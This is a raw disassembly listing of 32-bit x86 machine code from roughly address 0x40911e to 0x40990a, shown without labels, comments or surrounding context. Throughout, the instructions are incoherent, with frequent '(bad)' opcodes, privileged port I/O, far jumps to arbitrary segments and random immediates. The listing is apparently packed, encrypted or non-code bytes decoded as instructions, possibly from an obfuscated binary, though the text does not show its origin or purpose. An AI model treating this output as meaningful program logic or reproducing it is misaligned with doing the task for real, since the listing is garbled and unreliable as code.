  40911e:	push   cs
  40911f:	xor    eax,0x12897f86
  409124:	repz lock pop eax
  409127:	cmp    esp,DWORD PTR gs:[ecx]
  40912a:	or     ah,dl
  40912c:	in     eax,dx
  40912d:	adc    esi,DWORD PTR [ecx+0x4a4db6da]
  409133:	lea    edx,gs:[ebp-0x15]
  409137:	add    edi,esp
  409139:	jmp    0xfe182789
  40913e:	pop    edx
  40913f:	aad    0xb5
  409141:	pop    edi
  409142:	xor    ecx,DWORD PTR [ebx-0x7]
  409145:	or     eax,0x93d55dea
  40914a:	adc    edx,DWORD PTR [ebp+0x23092123]
  409150:	das    
  409151:	inc    ebx
  409152:	jmp    0xda718388
  409157:	mov    edx,0x17492720
  40915c:	out    dx,al
  40915d:	cmp    DWORD PTR ds:0xbb1c4b3a,ebx
  409163:	mov    ch,0x80
  409165:	scas   eax,DWORD PTR es:[edi]
  409166:	pop    ss
  409167:	into   
  409168:	fistp  WORD PTR [ebx+0x8]
  40916b:	sub    eax,0x3b81460f
  409170:	xchg   edx,eax
  409171:	ins    BYTE PTR es:[edi],dx
  409172:	nop
  409173:	inc    esp
  409174:	retf   
  409175:	bound  ecx,QWORD PTR [ecx+eiz*2]
  409178:	les    esp,FWORD PTR [edi+0x6d033e44]
  40917e:	gs push ss
  409180:	mov    dh,ch
  409182:	fiadd  DWORD PTR [ecx-0x24]
  409185:	mov    bl,0x9
  409187:	cld    
  409188:	test   DWORD PTR [edi-0x4a8d644f],esi
  40918e:	push   ss
  40918f:	xchg   BYTE PTR [ebp-0xe],dl
  409192:	in     al,dx
  409193:	push   0xffffff8a
  409195:	fcmovu st,st(1)
  409197:	push   0xffffffab
  409199:	(bad)  
  40919a:	mov    eax,ss
  40919c:	sub    DWORD PTR [ebp+0x39],ecx
  40919f:	test   al,0xcf
  4091a1:	popf   
  4091a2:	aaa    
  4091a3:	cmp    BYTE PTR [ebp-0x69],ch
  4091a6:	scas   al,BYTE PTR es:[edi]
  4091a7:	pop    esi
  4091a8:	mov    dl,dl
  4091aa:	sub    al,BYTE PTR [esi+0x55]
  4091ad:	mov    ah,0x5c
  4091af:	and    al,0xec
  4091b1:	pusha  
  4091b2:	xor    ebp,edi
  4091b4:	sbb    al,0x94
  4091b6:	aad    0x13
  4091b8:	pop    esp
  4091b9:	xchg   BYTE PTR [esi+0x6d],dl
  4091bc:	mov    dh,0x6c
  4091be:	pop    ss
  4091bf:	leave  
  4091c0:	lods   al,BYTE PTR ds:[esi]
  4091c1:	xchg   edi,eax
  4091c2:	cwde   
  4091c3:	dec    edi
  4091c4:	jmp    0xd1570790
  4091c9:	in     al,dx
  4091ca:	shl    DWORD PTR [edx-0x6f],1
  4091cd:	mov    bl,0x7b
  4091cf:	cmp    esi,DWORD PTR ds:0x1f73960c
  4091d5:	adc    dl,0xcf
  4091d8:	cmc    
  4091d9:	das    
  4091da:	(bad)  
  4091db:	scas   al,BYTE PTR es:[edi]
  4091dc:	push   ecx
  4091dd:	arpl   bp,dx
  4091df:	mov    edi,DWORD PTR [edx+0x5b707a99]
  4091e5:	aad    0x83
  4091e7:	inc    ebx
  4091e8:	cmp    ebx,DWORD PTR [edx+0x1]
  4091eb:	out    dx,al
  4091ec:	xchg   esi,eax
  4091ed:	shrd   DWORD PTR [edx+0x68],esi,cl
  4091f1:	adc    ch,BYTE PTR [ebx+0x324c1768]
  4091f7:	push   ebp
  4091f8:	mov    es,WORD PTR [esi]
  4091fa:	fst    DWORD PTR [esp+eax*4]
  4091fd:	imul   DWORD PTR [esi-0x2d]
  409200:	gs jno 0x40925b
  409203:	in     al,0xc6
  409205:	cmp    BYTE PTR [edi],cl
  409207:	(bad)  
  409208:	outs   dx,BYTE PTR ds:[esi]
  409209:	test   eax,0x3f83beef
  40920e:	es jle 0x409241
  409211:	xchg   DWORD PTR [ebx+0x42c5d8c4],edi
  409217:	pop    ss
  409218:	mov    edi,0x15ecdb01
  40921d:	stos   DWORD PTR es:[edi],eax
  40921e:	cmp    eax,0xb71c6645
  409223:	shr    DWORD PTR [ebx],0x95
  409226:	mov    bl,0x79
  409228:	jmp    0x8de6:0xfda33f6a
  40922f:	loop   0x409260
  409231:	mov    es,WORD PTR [edx+edi*1+0x3a]
  409235:	out    dx,al
  409236:	ror    esp,0x70
  409239:	jne    0x409201
  40923b:	xchg   edi,eax
  40923c:	mov    ds:0x73bd3bf7,al
  409241:	jl     0x409273
  409243:	jmp    0xac27:0x56d8b89c
  40924a:	mov    esi,0x539ad264
  40924f:	push   0xffffff8c
  409251:	(bad)  
  409252:	or     dh,BYTE PTR [esi-0x73ff93e5]
  409258:	(bad)
  40925c:	mov    DWORD PTR [esi],ecx
  40925e:	or     al,0xc
  409260:	pop    ds
  409261:	fsub   DWORD PTR [eax+ebx*2+0x7a4af8f9]
  409268:	add    esp,DWORD PTR [ebx]
  40926a:	out    0x45,eax
  40926c:	(bad)  
  40926d:	push   ss
  40926e:	inc    ecx
  40926f:	(bad)
  409272:	and    BYTE PTR [ebp+0x52f19830],ah
  409278:	sub    bh,BYTE PTR ds:[ebp+0x746bc6a4]
  40927f:	or     edi,eax
  409281:	popa   
  409282:	mov    ecx,0x6292871
  409287:	fldenv [bp+si]
  40928a:	daa    
  40928b:	jmp    FWORD PTR [ecx+0x2081f168]
  409291:	mov    ebp,0xd2d60fa4
  409296:	xchg   ebx,eax
  409297:	test   DWORD PTR [ebx],esp
  409299:	or     BYTE PTR [eax+ecx*4+0x1d193de0],0xe4
  4092a1:	xor    eax,0xb06c9592
  4092a6:	add    eax,0xa6940232
  4092ab:	cmp    BYTE PTR [edx-0x5f],dh
  4092ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092af:	jecxz  0x4092a5
  4092b1:	aam    0x8e
  4092b3:	fst    QWORD PTR [esi-0x45]
  4092b6:	stc    
  4092b7:	(bad)  
  4092b8:	jl     0x40931a
  4092ba:	out    dx,ax
  4092bc:	xchg   ecx,eax
  4092bd:	xchg   esi,eax
  4092be:	xchg   edx,eax
  4092bf:	aas    
  4092c0:	inc    ebx
  4092c1:	inc    esi
  4092c2:	mov    bl,BYTE PTR [ebp-0x2f]
  4092c5:	sub    ebp,ebx
  4092c7:	push   esi
  4092c8:	mov    ds:0x4744a8b5,al
  4092cd:	jmp    0x92d8:0x53b97a87
  4092d4:	mov    cs,WORD PTR [ecx]
  4092d6:	dec    esp
  4092d7:	push   esi
  4092d8:	call   0x303b:0xe6c096ea
  4092df:	mov    ch,0x71
  4092e1:	push   cs
  4092e2:	mov    edx,0xf7156106
  4092e7:	add    ecx,DWORD PTR [edx-0x7e]
  4092ea:	mov    bl,0x44
  4092ec:	pusha  
  4092ed:	inc    ebx
  4092ee:	lods   al,BYTE PTR ds:[esi]
  4092ef:	test   eax,0xaa9e2031
  4092f4:	mov    dh,0x37
  4092f6:	and    al,0x45
  4092f8:	mov    esp,0xdae30d5
  4092fd:	sub    eax,0xfface1d6
  409302:	xor    BYTE PTR [ebp+0x41b26005],cl
  409308:	add    bh,bh
  40930a:	xor    BYTE PTR [ebp+0x41b34405],cl
  409310:	add    bh,bh
  409312:	xor    BYTE PTR [edi-0x7cbcbc2d],al
  409318:	jmp    0x40931d
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	or     ebx,DWORD PTR [ebx-0x1dd89132]
  409333:	jo     0x4093a5
  409335:	and    BYTE PTR [ebp+0x70],bh
  409338:	jo     0x40938c
  40933a:	dec    esp
  40933b:	push   ebx
  40933c:	daa    
  40933d:	popa   
  40933e:	pushf  
  40933f:	push   edi
  409340:	pop    edi
  409342:	adc    BYTE PTR [eax],al
  409344:	sub    ch,0x55
  409347:	push   eax
  409348:	jp     0x409381
  40934a:	xor    ecx,esi
  40934c:	mov    cl,0x3f
  40934e:	clc    
  40934f:	and    DWORD PTR [eax],edi
  409351:	dec    edi
  409352:	lods   al,BYTE PTR ds:[esi]
  409353:	xchg   edi,eax
  409354:	adc    al,0x14
  409356:	push   edi
  409357:	jl     0x409340
  409359:	les    edx,FWORD PTR [eax+0x3d]
  40935c:	inc    esi
  40935d:	loop   0x40934e
  40935f:	out    0xc1,eax
  409361:	(bad)  
  409362:	icebp  
  409363:	cmp    eax,0xc1b388b9
  409368:	clc    
  409369:	sbb    BYTE PTR [edx],dh
  40936b:	and    al,0x61
  40936d:	call   0xab86:0x364da38
  409374:	cdq    
  409375:	and    al,0x27
  409377:	lock sbb BYTE PTR gs:[eax+0x55e4096e],ah
  40937f:	cmp    esp,DWORD PTR [edx]
  409381:	push   ss
  409382:	mov    esi,0x1b101799
  409387:	shl    edx,1
  409389:	dec    esp
  40938a:	sub    eax,0x9d9f8f04
  40938f:	shl    BYTE PTR [eax-0x4e63e47e],0xb4
  409396:	dec    edx
  409397:	(bad)  
  409399:	jmp    0x409349
  40939b:	ds js  0x4093a8
  40939e:	xor    BYTE PTR [esi-0x52],bl
  4093a1:	int    0xbd
  4093a3:	mov    al,0x3c
  4093a5:	mov    eax,ds:0xc5dcf68d
  4093aa:	and    ch,BYTE PTR [esi+0x7cf65d20]
  4093b0:	out    dx,eax
  4093b1:	cmp    BYTE PTR [edx+0x5beef649],al
  4093b7:	add    dh,BYTE PTR [ebp-0x103d0d29]
  4093bd:	ss fwait
  4093bf:	cmc    
  4093c0:	outs   dx,BYTE PTR ds:[esi]
  4093c1:	mov    ebx,0xab1a2c5e
  4093c6:	(bad)  
  4093c7:	xor    eax,0x457e2629
  4093cc:	sub    ebx,ebx
  4093ce:	lods   eax,DWORD PTR ds:[esi]
  4093cf:	pushf  
  4093d0:	fcompp 
  4093d2:	mov    ah,0x82
  4093d4:	pop    ebx
  4093d5:	cmp    eax,0x96c119df
  4093da:	loopne 0x409407
  4093dc:	pusha  
  4093dd:	jmp    0x409366
  4093df:	int3   
  4093e0:	sub    ebx,ebx
  4093e2:	in     eax,0x0
  4093e4:	mov    edx,0x1267220d
  4093e9:	das    
  4093ea:	ror    ebx,cl
  4093ec:	jb     0x4093b2
  4093ee:	dec    ebp
  4093ef:	repnz test BYTE PTR [edi-0x7c],0x2e
  4093f4:	and    BYTE PTR [ecx+0x11],dh
  4093f7:	aas    
  4093f8:	mov    al,ds:0x3585647
  4093fd:	mov    dl,0x2d
  4093ff:	mov    ebp,0x33c9a012
  409404:	sbb    al,0xd0
  409406:	jo     0x4093f5
  409408:	push   ebp
  409409:	dec    esi
  40940a:	test   BYTE PTR [esi+0x18],dh
  40940d:	rcl    ah,1
  40940f:	mov    dl,0xc1
  409411:	into   
  409412:	outs   dx,BYTE PTR ds:[esi]
  409413:	adc    eax,0xedbe5e4
  409418:	test   eax,0xa21e2961
  40941d:	add    BYTE PTR [edi+0x575b93b1],0xc9
  409424:	adc    eax,0x17065435
  409429:	in     al,dx
  40942a:	inc    edi
  40942b:	sti    
  40942c:	test   BYTE PTR [ebx],al
  40942e:	ror    DWORD PTR [eax],0xc4
  409431:	sbb    eax,DWORD PTR [esi-0x7d170b6]
  409437:	or     edx,DWORD PTR [edx]
  409439:	fmul   QWORD PTR [eax-0x3548fcf5]
  40943f:	add    ebp,DWORD PTR [esi-0x53b71fa5]
  409445:	cmp    ch,bh
  409447:	push   esp
  409448:	xchg   esp,eax
  40944a:	and    al,0xb6
  40944c:	rcr    DWORD PTR [eax+0x3b],cl
  40944f:	xchg   edi,eax
  409450:	sbb    DWORD PTR [edx],edi
  409452:	dec    ecx
  409453:	pop    ebp
  409454:	xor    DWORD PTR [ecx+0x54f089d],ebx
  40945a:	stos   BYTE PTR es:[edi],al
  40945b:	sub    DWORD PTR [eax-0x6b65f0bb],ebp
  409461:	push   edx
  409462:	dec    esp
  409463:	cmp    al,0x52
  409465:	jne    0x409440
  409467:	leave  
  409468:	int3   
  409469:	add    eax,0xc1faab29
  40946e:	cwde   
  40946f:	add    eax,0x58853d72
  409474:	loop   0x40940e
  409476:	pop    edx
  409477:	ficomp DWORD PTR [ebp+edx*4+0x67]
  40947b:	pop    edx
  40947c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40947d:	push   0xffffff9b
  40947f:	mov    ch,0x39
  409481:	xor    al,0xc7
  409483:	sub    BYTE PTR [edi],dl
  409485:	add    BYTE PTR [eax+edi*4-0x37],0xc9
  40948a:	iret   
  40948b:	push   edi
  40948c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40948d:	ror    DWORD PTR [edx+0xe],1
  409490:	test   DWORD PTR [edi-0x4cf91ad],eax
  409496:	and    dl,BYTE PTR [edx-0x58]
  409499:	inc    esi
  40949a:	(bad)  
  40949b:	mov    ds:0x40dbe7a0,eax
  4094a0:	mov    DWORD PTR [eax-0x22fe2214],esp
  4094a6:	add    al,BYTE PTR [ecx+0xc70bb7e]
  4094ac:	add    al,0x13
  4094ae:	dec    esi
  4094af:	mov    cl,0xb0
  4094b1:	push   edx
  4094b2:	sbb    al,0x8a
  4094b4:	ins    DWORD PTR es:[edi],dx
  4094b5:	(bad)  
  4094b7:	xor    BYTE PTR [edi],bh
  4094b9:	repz mov eax,0xb37e9ad7
  4094bf:	mov    BYTE PTR [eax+edi*8],ch
  4094c2:	sub    eax,0xed46cd87
  4094c7:	loope  0x4094be
  4094c9:	sub    ecx,esi
  4094cb:	fcomp  QWORD PTR [edi]
  4094cd:	stc    
  4094ce:	add    DWORD PTR [bx-0x4505],ecx
  4094d3:	dec    esi
  4094d4:	push   ecx
  4094d5:	in     al,0x5f
  4094d7:	inc    esi
  4094d8:	jbe    0x409540
  4094da:	call   0xd719:0xf8a9a62
  4094e1:	sbb    BYTE PTR [edx-0x5f1ea7e4],dh
  4094e7:	push   esp
  4094e8:	ins    DWORD PTR es:[edi],dx
  4094e9:	jecxz  0x40953d
  4094eb:	call   0xdc9e177e
  4094f0:	retf   
  4094f1:	inc    ecx
  4094f2:	scas   al,BYTE PTR es:[edi]
  4094f3:	fldcw  WORD PTR [edi+0x3c]
  4094f6:	je     0x409517
  4094f8:	push   ebx
  4094f9:	ror    BYTE PTR [ecx+0x56],cl
  4094fc:	mov    cl,0x54
  4094fe:	and    eax,0x7401e57c
  409503:	cmp    DWORD PTR [ebp-0x3aab03df],ebp
  409509:	push   eax
  40950a:	mov    eax,0xa5073928
  40950f:	jg     0x40949d
  409511:	in     al,0x80
  409513:	mov    eax,ds:0x6204cd79
  409519:	push   cs
  40951a:	ficom  WORD PTR [ebp-0xd]
  40951d:	test   eax,0x94329ff
  409522:	(bad)  
  409524:	add    dh,BYTE PTR [ecx]
  409526:	xchg   ebp,eax
  409527:	fsubr  DWORD PTR [esi+0x58]
  40952a:	push   eax
  40952b:	add    al,0xf9
  40952d:	(bad)  
  40952e:	iretw  
  409530:	add    edi,DWORD PTR [ebp+0x2533b2d4]
  409536:	inc    esp
  409537:	aam    0x53
  409539:	fsubr  QWORD PTR [ebx+0x7723afd]
  40953f:	cmp    al,0x4
  409541:	sub    dh,BYTE PTR [edx-0x7e]
  409544:	mov    DWORD PTR [edi+0x50],esp
  409547:	addr16 pop edx
  409549:	ins    DWORD PTR es:[edi],dx
  40954a:	xor    BYTE PTR [edi],ah
  40954c:	(bad)  
  40954d:	leave  
  40954e:	clc    
  40954f:	add    edi,DWORD PTR [ecx+0x16]
  409552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409553:	(bad)  
  409554:	(bad)  
  409556:	jecxz  0x409525
  409558:	int3   
  409559:	inc    ebx
  40955a:	mov    ch,0x84
  40955c:	mov    dl,0xac
  40955e:	test   BYTE PTR [ebx-0x24a7afb0],cl
  409564:	adc    eax,0x2d33db68
  409569:	and    ebx,eax
  40956b:	pop    ebx
  40956c:	ja     0x40953b
  40956e:	lods   eax,DWORD PTR ds:[esi]
  40956f:	seto   BYTE PTR [ebx+0x41339706]
  409576:	mov    ch,0xe5
  409578:	sub    edx,DWORD PTR [edx]
  40957a:	pop    es
  40957b:	jne    0x4095b1
  40957d:	jp     0x409599
  40957f:	mov    eax,ds:0x4e537aea
  409584:	jge    0x409543
  409586:	fwait
  409587:	stos   BYTE PTR es:[edi],al
  409588:	enter  0x1433,0x3a
  40958c:	dec    ecx
  40958d:	mov    esp,0x3415c96e
  409592:	aaa    
  409593:	imul   eax,DWORD PTR [eax-0xe1e86a8],0xffffffad
  40959a:	pop    esp
  40959b:	retf   
  40959c:	jbe    0x409600
  40959e:	adc    edx,DWORD PTR [ebx+0x75]
  4095a1:	jmp    0x1f6376d8
  4095a6:	dec    ebp
  4095a7:	xchg   ecx,eax
  4095a8:	outs   dx,DWORD PTR ds:[esi]
  4095a9:	add    al,0xf3
  4095ab:	xor    bh,BYTE PTR [edi-0x28894a13]
  4095b1:	cmp    al,0x10
  4095b3:	inc    eax
  4095b4:	lods   al,BYTE PTR ds:[esi]
  4095b5:	or     DWORD PTR [ecx-0x43],ebp
  4095b8:	scas   eax,DWORD PTR es:[edi]
  4095b9:	popf   
  4095ba:	in     al,dx
  4095bb:	jno    0x409633
  4095bd:	add    eax,DWORD PTR [ebx-0x64f3837e]
  4095c3:	cmp    al,0x5f
  4095c5:	sub    ebp,esi
  4095c7:	int3   
  4095c8:	jo     0x409643
  4095ca:	xor    al,0xee
  4095cc:	adc    eax,0x69917ae5
  4095d1:	xlat   BYTE PTR ds:[ebx]
  4095d2:	popf   
  4095d3:	jg     0x409613
  4095d5:	test   BYTE PTR [edi+0x11],bl
  4095d8:	shl    DWORD PTR [edi-0x42],1
  4095db:	xchg   ebp,eax
  4095dc:	ins    DWORD PTR es:[edi],dx
  4095dd:	xor    cl,BYTE PTR [ebx+0x8]
  4095e0:	shr    DWORD PTR [eax-0x3eed530d],cl
  4095e6:	sbb    ebp,esi
  4095e8:	leave  
  4095e9:	mov    WORD PTR [ecx-0x1acae071],es
  4095ef:	mov    WORD PTR [eax+0x4dad6c26],?
  4095f5:	cmp    esp,ebp
  4095f7:	not    BYTE PTR [ebp+0x3bca36c3]
  4095fd:	out    dx,eax
  4095fe:	jo     0x40963a
  409600:	(bad)  
  409601:	nop
  409602:	in     al,0xb3
  409604:	jne    0x4095fe
  409606:	fld    TBYTE PTR [ebx-0x80]
  409609:	mov    WORD PTR [eax+0x32899865],ss
  40960f:	jnp    0x409632
  409611:	sub    dh,BYTE PTR [esp+ebx*2]
  409614:	and    BYTE PTR [eax+0x38a130fe],dl
  40961a:	rcr    DWORD PTR [ecx+0x5ddd7f2c],1
  409620:	and    DWORD PTR [eax-0x68],edi
  409623:	or     eax,0x1f547a47
  409628:	sti    
  409629:	lods   al,BYTE PTR ds:[esi]
  40962a:	daa    
  40962b:	push   edi
  40962c:	xchg   edi,eax
  40962d:	and    ebx,edx
  40962f:	iret   
  409630:	add    al,0xd2
  409632:	(bad)  
  409633:	cmp    BYTE PTR [esi],ch
  409635:	sahf   
  409636:	and    eax,0x31f3b58a
  40963b:	data16 (bad) 
  40963d:	push   edx
  40963e:	cmp    al,0x78
  409640:	pop    ecx
  409641:	fidiv  WORD PTR [edi]
  409643:	mov    edi,DWORD PTR [esp+ecx*2]
  409646:	dec    eax
  409647:	xor    eax,0xf5012f33
  40964c:	stc    
  40964d:	sub    al,0xd2
  40964f:	mov    esi,DWORD PTR ds:0x7e16bb0a
  409655:	cli    
  409656:	lods   al,BYTE PTR ds:[esi]
  409657:	dec    edx
  409658:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40965a:	sbb    DWORD PTR [edx-0x29],ebx
  40965d:	xor    BYTE PTR [edx-0x4],cl
  409660:	aas    
  409661:	mov    eax,0xa9aaf5ae
  409666:	adc    al,0xf6
  409668:	mov    ecx,0x8b0150ff
  40966d:	inc    ebp
  40966e:	loopne 0x4095fb
  409670:	or     eax,0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   edi,ecx
  409687:	inc    BYTE PTR [ebp+0x6e]
  40968a:	xlat   BYTE PTR ds:[ebx]
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x40970b
  409693:	fwait
  409694:	jo     0x409715
  409696:	inc    edx
  409697:	sbb    esp,ebx
  409699:	mov    ch,0x4
  40969b:	add    BYTE PTR [edi-0x189de60b],bh
  4096a1:	dec    ecx
  4096a2:	nop
  4096a3:	mov    ch,0xfe
  4096a5:	xchg   edx,eax
  4096a6:	xchg   edi,eax
  4096a7:	dec    eax
  4096a8:	vminpd xmm4,xmm3,XMMWORD PTR [ebx+0x5e1c37ca]
  4096b0:	pusha  
  4096b1:	mov    BYTE PTR [ecx+eiz*1+0x4ecf33fc],0x28
  4096b9:	int    0x2b
  4096bb:	add    BYTE PTR [ecx+0x14],al
  4096be:	mov    ebx,DWORD PTR [esi]
  4096c0:	xor    ah,BYTE PTR [ebp+0x77]
  4096c3:	or     BYTE PTR [ebx+ecx*1-0x30],ah
  4096c7:	pop    ecx
  4096c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096c9:	clc    
  4096ca:	sub    dl,dh
  4096cc:	test   al,0xa3
  4096ce:	mov    al,ds:0xdea4bd16
  4096d3:	push   es
  4096d4:	pop    ss
  4096d5:	jp     0x409672
  4096d7:	fadd   QWORD PTR [ecx+edx*4+0x441864d4]
  4096de:	call   DWORD PTR [esi-0xb37486d]
  4096e4:	inc    edx
  4096e5:	and    DWORD PTR [edi-0x2eac95d9],0x8663b213
  4096ef:	lock xchg DWORD PTR [ebp-0x166e1540],edx
  4096f6:	out    dx,al
  4096f7:	loopne 0x4096ba
  4096f9:	fimul  DWORD PTR [esi]
  4096fb:	xor    al,0x86
  4096fd:	push   cs
  4096fe:	xchg   edx,eax
  4096ff:	fisub  DWORD PTR ds:0x16a6a8b6
  409705:	jg     0x409758
  409707:	xchg   ebp,eax
  409708:	push   edx
  409709:	cdq    
  40970a:	xor    eax,0x9e24e075
  40970f:	xor    ebx,ecx
  409711:	sub    ch,BYTE PTR [eax+0x10]
  409714:	sub    ecx,edx
  409716:	cmp    eax,0xfaf3f173
  40971b:	mov    esp,0xa4bf3bdd
  409720:	inc    edi
  409721:	sub    DWORD PTR [edx-0x3b],ecx
  409724:	scas   al,BYTE PTR es:[edi]
  409725:	dec    esi
  409726:	retf   0x6a55
  409729:	outs   dx,DWORD PTR ds:[esi]
  40972a:	pop    edi
  40972b:	cmc    
  40972c:	pop    esi
  40972d:	(bad)  
  40972e:	mov    edi,0xa31a484c
  409733:	dec    edi
  409734:	xlat   BYTE PTR ds:[ebx]
  409735:	mov    al,ds:0x736e42e9
  40973a:	aaa    
  40973b:	lods   al,BYTE PTR ds:[esi]
  40973c:	test   BYTE PTR [ecx],bl
  40973e:	sub    cl,BYTE PTR [esi+0x6c]
  409741:	pushf  
  409742:	ja     0x409777
  409744:	imul   eax,DWORD PTR ds:0x17557082,0x29
  40974b:	push   es
  40974c:	or     al,0x4e
  40974e:	nop
  40974f:	mov    ah,0xf6
  409751:	push   esp
  409752:	int3   
  409753:	jne    0x4096e5
  409755:	xchg   edx,eax
  409756:	and    dl,BYTE PTR [edi+0x30fce264]
  40975c:	mov    cl,ah
  40975e:	mov    dl,0x97
  409760:	xor    ebx,esi
  409762:	in     al,dx
  409763:	cld    
  409764:	es test ch,bl
  409767:	dec    edi
  409768:	sbb    al,0x97
  40976a:	jecxz  0x4097a4
  40976c:	addr16 jl 0x40971c
  40976f:	ffreep st(5)
  409771:	and    DWORD PTR [eax+esi*4],edx
  409774:	and    DWORD PTR [edi],edi
  409776:	sbb    BYTE PTR [ebx+0x68bbc019],al
  40977c:	or     al,0xe5
  40977e:	sub    cl,ch
  409780:	or     ah,BYTE PTR [edi]
  409782:	cmp    DWORD PTR [esi+0x2a],ebx
  409785:	push   0x42032483
  40978a:	out    0xac,eax
  40978c:	imul   ebp,DWORD PTR [edi],0x4b
  40978f:	cdq    
  409790:	and    al,0xcf
  409792:	sub    eax,esp
  409794:	inc    eax
  409795:	mov    eax,0x8f610a0a
  40979a:	and    DWORD PTR [eax],edx
  40979c:	mov    ecx,0x7802da9d
  4097a1:	lock loope 0x409787
  4097a4:	rcl    DWORD PTR [edx-0x4a1d0ed1],1
  4097aa:	out    dx,eax
  4097ab:	and    esp,esp
  4097ad:	imul   DWORD PTR [ecx-0x31]
  4097b0:	(bad)
  4097b5:	ret    
  4097b6:	xchg   edi,eax
  4097b7:	retf   0x1ce3
  4097ba:	mul    DWORD PTR [edi]
  4097bc:	out    dx,al
  4097bd:	pop    esp
  4097be:	mov    ?,esi
  4097c0:	jp     0x409768
  4097c2:	mov    bl,BYTE PTR [ebx]
  4097c4:	push   0x19
  4097c6:	in     eax,dx
  4097c7:	jecxz  0x409801
  4097c9:	cmp    bh,bh
  4097cb:	stos   DWORD PTR es:[edi],eax
  4097cc:	sbb    bl,BYTE PTR [edi-0x1cc2457d]
  4097d2:	mov    esp,0x27bc8ee6
  4097d7:	jg     0x4097a4
  4097d9:	push   ebp
  4097db:	jae    0x4097d0
  4097dd:	mov    eax,ds:0x3612b1d5
  4097e2:	call   0x8199:0xc75127f1
  4097e9:	retf   
  4097ea:	adc    bl,BYTE PTR [esp+ebx*4]
  4097ed:	in     al,dx
  4097ee:	fisub  WORD PTR [esi-0x22]
  4097f1:	rcr    edx,1
  4097f3:	and    al,0x91
  4097f5:	sar    BYTE PTR gs:[edi+0x4d0af1d1],cl
  4097fc:	sub    al,0xd7
  4097fe:	aaa    
  4097ff:	mov    cl,0xdf
  409801:	and    DWORD PTR [ebx],esi
  409803:	cmp    DWORD PTR [edi-0x73],0x5d2b945e
  40980a:	xchg   ecx,eax
  40980b:	sub    DWORD PTR [ecx],ecx
  40980d:	dec    eax
  40980e:	add    eax,0xadf020f2
  409813:	loop   0x409804
  409815:	shl    ecx,cl
  409817:	jns    0x40982e
  409819:	test   DWORD PTR [ecx+0x76cecc35],ebx
  40981f:	mov    ds:0xf03d38a9,al
  409824:	adc    ch,BYTE PTR [esi]
  409826:	and    bl,BYTE PTR [eax-0x3a]
  409829:	xor    BYTE PTR [esi-0x36d38fd4],cl
  40982f:	ret    0xc28e
  409832:	xchg   esp,eax
  409833:	test   al,0x6e
  409835:	sub    BYTE PTR [eax-0x54],bl
  409838:	push   edi
  409839:	or     eax,0x8ccf062b
  40983e:	stos   BYTE PTR es:[edi],al
  40983f:	rcl    BYTE PTR [edi],0x44
  409842:	pop    ebx
  409843:	je     0x409890
  409845:	or     eax,0x33b6a930
  40984a:	pop    ebx
  40984b:	cwde   
  40984c:	add    al,0x1
  40984e:	inc    ebx
  40984f:	out    0x24,al
  409851:	jns    0x409829
  409853:	add    eax,0x2c7c1d2c
  409858:	xchg   DWORD PTR [eax],ebx
  40985a:	pop    edi
  40985b:	daa    
  40985c:	mov    esp,0x4288f234
  409861:	or     ah,BYTE PTR [eax+0x68e80c7c]
  409867:	sub    DWORD PTR [edx],0x53
  40986a:	adc    edx,DWORD PTR [ebp-0x1951dad4]
  409870:	push   ecx
  409871:	cld    
  409872:	imul   edi,DWORD PTR ds:0x2b38c846,0xfffffffb
  409879:	jge    0x40987f
  40987b:	ret    
  40987c:	fst    QWORD PTR [edi+0x71]
  40987f:	nop
  409880:	or     DWORD PTR [eax],edx
  409882:	rcl    BYTE PTR [esi],0x45
  409885:	adc    eax,DWORD PTR [ebx+0x79ce1135]
  40988b:	pop    ecx
  40988c:	fwait
  40988d:	jge    0x40987d
  40988f:	gs in  eax,dx
  409891:	adc    BYTE PTR [ecx+eax*8+0x3177da6e],cl
  409898:	or     ah,dl
  40989a:	add    ebx,DWORD PTR [ecx+ecx*1]
  40989d:	or     cl,dh
  40989f:	inc    ebp
  4098a0:	and    ebp,DWORD PTR ds:0xa61eecb5
  4098a6:	rol    DWORD PTR [esi],1
  4098a8:	test   al,0x3e
  4098aa:	push   DWORD PTR [edx+0x37]
  4098ad:	loope  0x40983a
  4098af:	mov    DWORD PTR [esi],ebp
  4098b1:	inc    ebx
  4098b2:	mov    eax,ecx
  4098b4:	mov    gs,edi
  4098b6:	inc    edx
  4098b7:	mov    BYTE PTR [esi],dh
  4098b9:	repnz add DWORD PTR ss:0xa7c06df7,ebx
  4098c1:	ins    DWORD PTR es:[edi],dx
  4098c2:	cmp    eax,0x19ec547e
  4098c7:	adc    edi,DWORD PTR [ecx]
  4098c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098ca:	xor    al,0x42
  4098cc:	xchg   ecx,eax
  4098cd:	jmp    0xf58:0x59dd5864
  4098d4:	jge    0x4098ec
  4098d6:	leave  
  4098d7:	sbb    esp,DWORD PTR [ebp+0xd179803]
  4098dd:	sub    BYTE PTR [ecx+ecx*8+0x75f538ef],dl
  4098e4:	aas    
  4098e5:	dec    eax
  4098e6:	pop    ds
  4098e7:	into   
  4098e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098e9:	retfw  
  4098eb:	adc    al,BYTE PTR [ecx]
  4098ed:	adc    bl,BYTE PTR [ecx]
  4098ef:	enter  0x14bf,0x33
  4098f3:	ins    BYTE PTR es:[edi],dx
  4098f4:	imul   ecx,DWORD PTR ds:0x368c17d,0xe439cff6
  4098fe:	stos   DWORD PTR es:[edi],eax
  4098ff:	add    eax,0xe06b2c14
  409904:	(bad)  
  409905:	adc    esi,ebp
  409907:	aaa    
  409908:	clc    
  409909:	dec    ebp
  40990a:	cs mov ah,dh
